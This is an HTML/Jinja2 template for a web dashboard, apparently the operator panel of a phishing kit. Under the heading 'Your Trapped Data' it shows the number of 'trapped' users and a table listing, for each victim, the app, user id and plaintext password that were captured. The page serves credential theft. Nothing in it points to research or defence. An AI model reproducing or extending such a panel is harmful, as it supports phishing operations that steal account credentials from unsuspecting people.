<!DOCTYPE html>
<html>
  <head>
    <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <link rel="icon" type="image/x-icon" href="{{ url_for('static', filename='favicon.png')}}">
  
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
  <link rel='stylesheet' type="text/css" href="/static/nav.css">
  <script src="/static/nav.js"></script>
  <title>Dashboard</title>  

  <style>
      table, th, td {
  border:1px solid black;
}
  </style>
</head>

<body style="background-color: #EEE2DC; color: #AC3B61;">


  <div class="topnav" style="margin:auto;">

    <a  href="/">Home</a>
    <a  href="/apps">Apps</a>
    <a  class="active" href="#dashboard">Dashboard</a>

    <div>
      
     
      <input type="submit" id="logout_button"
      class="btn btn-danger"
      {% if isLogged == True %} 
      value="Logout" onclick="logout()"
      {% else %}
      style="display: none;"
      {% endif %}
      ></input> 
      
      
      <input type="submit" id="login_button" 
      class="btn btn-info"
      {% if isLogged == True %} 
      value={{uid}} onclick="see_user()"
      {% else %}
      value="Login" onclick="login()"
      {% endif %}></input>
    </div>

  </div>




    <center><h2>Your Trapped Data</h2></center>
    <div style="display: inline-flex;">
   <h3>Total numebr of traped users: </h3>
   <h3 style="color: black; box-shadow: 0 12px 16px 0 rgba(0,0,0,0.24), 0 17px 50px 0 rgba(0,0,0,0.19); width: min-content;" >{{data[1]}}</h3>
  </div>
   <table style="width:100%">
        <tr>
          <th>App</th>
          <th>Id</th>
          <th>Password</th>
        </tr>
        {% for row in data[0] %}
        <tr>
          <td>{{row[1]}}</td>
          <td>{{row[2]}}</td>
          <td>{{row[3]}}</td>
        </tr>
        {% endfor %}
      </table>





</body>

</html>
